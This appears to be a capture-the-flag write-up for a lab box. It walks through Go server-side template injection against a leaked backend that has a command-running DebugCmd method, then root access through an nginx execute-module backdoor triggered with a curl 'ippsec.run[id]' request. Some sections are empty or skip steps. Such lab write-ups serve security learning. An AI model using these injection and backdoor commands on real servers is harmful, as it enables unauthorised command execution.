## Enumerating WebServer specifics
Since we have a Login form on Port 8080, we will start there.

First we inspect the Response Headers to see whether the WebServer leaks anything useful, and the forwarded-to header tells us the Request is being passed to a Golang WebServer. 

![](golang.png)

**So after being stuck for a while, an idea came up.**

-A Golang backend, A {{.Title}} output being leaked (in the nmap output), what if this is a Golang Template being used, and what if we can inject our own Template Code to retrieve Information?

We know templating Syntax usually looks something like {{7*7}}, which the Engine would evaluate and render back as 49. Other variants exist, but this one is enough to work with.

So if a **Template** really is in play (and in the end we are always working off Assumptions), then the natural next move is to feed Template Syntax into any Input we can reach and watch for it to evaluate.

Lets try to inject "{" into the Input fields, we dont know how the structure is, so lets first get the Proof of Concept, if it crashes, it works.

***We test using Burp:***

![](crashed.png)

Great, it crashed, so our assumption becomes fact. Our Input is parsed as Server-Side Template Code and gets executed.

The Issue is that the Way things are being handled, and functions in the backend are not present, we cannot try to brutforce Code execution when we dont even know what the SourceCode looks like.

## Foothold
Logged into the Form we finally see the Source code of the Backend

```go
  
package main

import(
    "html/template"
    "net/http"
    "log"
    "os/exec"
    "fmt"
    "bytes"
    "strings"
)

// compile all templates and cache them
var templates = template.Must(template.ParseGlob("templates/*"))

type Data struct {
    Title string // Must be exported!
    Body string  // Must be exported!
}

type User struct {
        ID       int
        Email    string
        Password string
}


func (u User) DebugCmd (test string) string {
  ipp := strings.Split(test, " ")
  bin := strings.Join(ipp[:1], " ")
  args := strings.Join(ipp[1:], " ")
  if len(args) > 0{
    out, _ := exec.Command(bin, args).CombinedOutput()
    return string(out)
  } else {
    out, _ := exec.Command(bin).CombinedOutput()
    return string(out)
  }
}

// Renders the templates
func renderTemplate(w http.ResponseWriter, tmpl string, page *Data) {
	err := templates.ExecuteTemplate(w, tmpl, page)
	if err != nil {
    http.Error(w, err.Error(), http.StatusInternalServerError)
    return
	}
}

func IndexHandler(w http.ResponseWriter, r *http.Request) {
  switch r.Method {
  case "GET":
	page := &Data{Title:"Home page", Body:"Welcome to our brand new home page."}
	renderTemplate(w, "index", page)
  case "POST":
	page := &Data{Title:"Home page", Body:"Welcome to our brand new home page."}
    if r.FormValue("password") == "ippsSecretPassword" {
      renderTemplate(w, "source", page )
    } else {
      renderTemplate(w, "index", page)
    }
  }
}

func ForgotHandler(w http.ResponseWriter, r *http.Request) {
    switch r.Method {
    case "GET":
      page := &Data{Title:"Forgot Password", Body:""}
      renderTemplate(w, "forgot", page)
    case "POST":
      var user1 = &User{1, "ippsec@hacking.esports", "ippsSecretPassword"}
      var tmpl = fmt.Sprintf(`Email Sent To: %s`, r.FormValue("email"))

      t, err := template.New("page").Parse(tmpl)
      if err != nil {
          fmt.Println(err)
      }

      var tpl bytes.Buffer
      t.Execute(&tpl, &user1)
      page := &Data{Title:"Forgot Password", Body:tpl.String()}
      renderTemplate(w, "forgot", page)
    }
}


func main(){
  http.HandleFunc("/", IndexHandler)
  http.HandleFunc("/forgot/", ForgotHandler)
  log.Fatal(http.ListenAndServe(":80", nil))
}
```

What becomes apperant is the DebugCmd function
```go

```
So essentially , it takes the first string as the Program, the rest as Arguments, parses, executes and returns the output.

Its a function specifically assigned to a Struct of Type User.

Inspecting the whole gofile, we see the following

We see that we were able to access the values of the User struct, since we are essentially being passed into the Template as an Object of type User.

This matters because a Go Template does not just read Fields off that Object, it can also call the Methods defined on it. So once we know the Context is a User, every exported Method on User becomes reachable from inside our Injection.

##  Privilege Escalation
After enumerating for a bit, i went ot check NGINX.
- My reasoning is that when a lot of WebServers are in play, it pays to look at the listening Ports and read through the Configuration, since more often than not it reveals a lot about what is actually going on behind the scenes.

**Nginx is running as root**
```bash
ps -aux | grep root

--- Snip ---

root         956  0.0  0.1  55868  5228 ?        S    19:17   0:00 nginx: worker process
root         957  0.0  0.1  56204  6248 ?        S    19:17   0:00 nginx: worker process
--- Snip ---
```

Sounds very specific , i could reverse the binary and then try to lookup information about this, but the earlier the better.

Using SearchEngines like Google or SearchNG we find the following when looking up **"ngx_http_execute_module.so"**:
- https://github.com/limithit/NginxExecute

Cool, so taking a look at it, one has to have set following module within the nginx site config:
```bash
location ... {
            ......
            command on;
        }
``` 
Okay, lets search
```bash
www-data@gobox:/etc/nginx$ grep -r command
grep -r command
sites-available/default:		command on;
```

```bash
cat /etc/nginx/sites-enabled/default
--- Snip ---
erver {
	listen 127.0.0.1:8000;
	location / {
		command on;
	}
}
```
So backdoor enabled on nginx on port 8000. 
**Trying:**
```bash
curl -p http://localhost:8000/?system.run[id]
curl: (52) Empty reply from server
```
I guess the backdoor command is something different.
The module can be found under:
```bash
/usr/lib/nginx/modules/ngx_http_execute_module.so
```
So lets reverse it using GHIDRA to see if we can find any clues.
- After looking for a Short time in Ghidra, we find that following parameter is being called ?ippsec.run[COMMAND]

We can also "strings" the module which also gives us the parameter when grepping for specific signs of it:
```bash
www-data@gobox:/$ strings /usr/lib/nginx/modules/ngx_http_execute_module.so | grep .run
<ginx/modules/ngx_http_execute_module.so | grep .run
ippsec.run
``` 
And at last, we can finally beat this Box by doing the following
```
curl "http://localhost:8000?ippsec.run[id]"
uid=0(root) gid=0(root) groups=0(root)
```
